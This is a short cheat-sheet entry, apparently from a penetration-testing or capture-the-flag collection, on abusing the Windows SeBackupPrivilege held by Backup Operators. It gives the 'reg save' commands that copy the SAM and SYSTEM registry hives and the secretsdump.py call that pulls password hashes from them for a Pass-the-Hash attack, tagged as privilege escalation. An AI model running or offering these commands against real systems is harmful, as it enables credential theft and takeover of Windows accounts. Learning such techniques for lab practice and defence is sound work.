---
description: |
  If a user has the SeBackupPrivilege or SeRestorePrivilege rights, which is default when a user is in the "Backup Operators" group. The user can backup the SAM and SYSTEM hashes, which can be usefull to start a Pass-The-Hash attack. With the commands it is possible to extract the SAM en SYSTEM hashes from the registry.

  Command Reference:
  ```
  Register: hklm\system & hklm\sam
  ```
command: |
  reg save hklm\system C:\Users\THMBackup\system.hive

code: |
  reg save hklm\sam C:\Users\THMBackup\sam.hive 

  After retrieving use secretsdump:
  secretsdump.py -sam '/path/to/sam.hive' -system '/path/to/system.hive' LOCAL

items:
  - Shell
OS:
  - Windows
attack_types:
  - Emumeration
  - PrivEsc
references:
  - https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md
---